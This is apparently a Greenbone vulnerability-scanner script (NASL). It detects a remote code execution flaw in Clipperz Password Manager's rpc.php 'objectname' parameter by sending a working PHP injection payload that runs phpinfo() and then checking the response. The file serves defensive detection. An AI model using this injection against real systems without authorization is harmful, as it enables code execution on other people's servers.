# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804607");
  script_version("2024-06-28T05:05:33+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-05-26 14:49:09 +0530 (Mon, 26 May 2014)");
  script_name("Clipperz Password Manager 'objectname' RCE Vulnerability");

  script_tag(name:"summary", value:"Clipperz Password Manager is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP GET request and check is it possible to execute an
  arbitrary php code.");

  script_tag(name:"insight", value:"The error exists as input passed via the 'objectname' parameter is not properly
  sanitized upon submission to the /backend/php/src/setup/rpc.php script");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary php code.");

  script_tag(name:"affected", value:"Clipperz Password Manager.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126713");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/67498");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/clipperz-password-manager-code-execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");

pwmPort = http_get_port(default:80);

if(!http_can_host_php(port:pwmPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/clipperz", "/password-manager-master", "/pass-mgr", http_cgi_dirs(port:pwmPort)))
{

  if(dir == "/") dir = "";

  pwmReq = http_get(item:string(dir, "/beta/index.html"), port:pwmPort);
  pwmRes = http_keepalive_send_recv(port:pwmPort, data:pwmReq);

  if(pwmRes && ">Clipperz" >< pwmRes)
  {
    url = dir + "/backend/php/src/setup/rpc.php?objectname=Xmenu();print_r(phpinfo());die";

    if(http_vuln_check(port:pwmPort, url:url, check_header:TRUE,
       pattern:">PHP Version", extra_check: make_list(">Loaded Modules",
       ">HTTP Headers Information<")))
    {
      report = http_report_vuln_url( port:pwmPort, url:url );
      security_message(port:pwmPort, data:report);
      exit(0);
    }
  }
}

exit(99);
